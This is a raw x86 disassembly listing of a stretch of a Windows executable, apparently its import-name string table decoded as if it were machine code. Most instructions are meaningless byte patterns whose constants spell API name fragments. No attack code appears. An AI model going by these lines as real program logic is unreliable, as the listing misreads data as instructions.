  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
